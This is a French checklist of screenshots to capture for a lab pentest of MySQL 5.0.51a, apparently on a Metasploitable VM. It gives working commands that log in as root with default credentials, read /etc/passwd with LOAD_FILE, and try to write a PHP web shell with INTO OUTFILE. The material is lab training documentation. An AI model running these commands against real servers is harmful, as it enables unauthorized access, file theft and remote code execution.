# Captures — MySQL 5.0.51a (identifiants par défaut + privilège FILE, port 3306)

Consignes de capture pour `services/mysql.html` (à construire). Commandes identiques à
`ms1/josa/mysql.md`.

> IP de ce poste (josa, réseau `vboxnet0`) : cible `192.168.56.102`.
> (Le coéquipier est sur `172.28.128.x` — ses captures à lui utiliseront ses propres IP.)

## 01-recon-nmap.png

Commande :
```bash
nmap -sC -sV -p 3306 192.168.56.102
```

Encadré en rouge : `3306/tcp open mysql MySQL 5.0.51a-3ubuntu5`.

## 02-auth-root.png

Les deux commandes à la suite (échec TLS puis succès avec `--skip-ssl`) :
```bash
mysql -h 192.168.56.102 -u root -proot -e "SELECT VERSION();"
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT VERSION(); SELECT CURRENT_USER();"
```

Encadré en rouge : `ERROR 2026 ... TLS/SSL error` (échec, montré tel quel) et `root@%`
(authentification réussie).

## 03-privileges.png

Les deux commandes à la suite :
```bash
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SHOW GRANTS FOR root@'%';"
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT user, File_priv FROM mysql.user WHERE user='root';"
```

Encadré en rouge : `GRANT ALL PRIVILEGES ON *.* ... WITH GRANT OPTION` et `File_priv = Y`.

## 04-load-file.png

Commande :
```bash
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT LOAD_FILE('/etc/passwd');"
```

Encadré en rouge : les lignes `msfadmin:...`, `user:...`, `service:...` dans le contenu lu —
preuve de lecture arbitraire d'un fichier système sensible.

## 05-write-attempt.png

Les trois commandes à la suite (échec webroot puis confirmation du mécanisme via /tmp) :
```bash
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/tikiwiki/mysqlshell.php';"
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT 'test_mysql_file_priv' INTO OUTFILE '/tmp/mysql_write_test.txt';"
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT LOAD_FILE('/tmp/mysql_write_test.txt');"
```

Encadré en rouge : `ERROR 1 ... Errcode: 13` (échec webroot) et `test_mysql_file_priv`
(confirmation que l'écriture fonctionne ailleurs — le privilège FILE est bien actif).
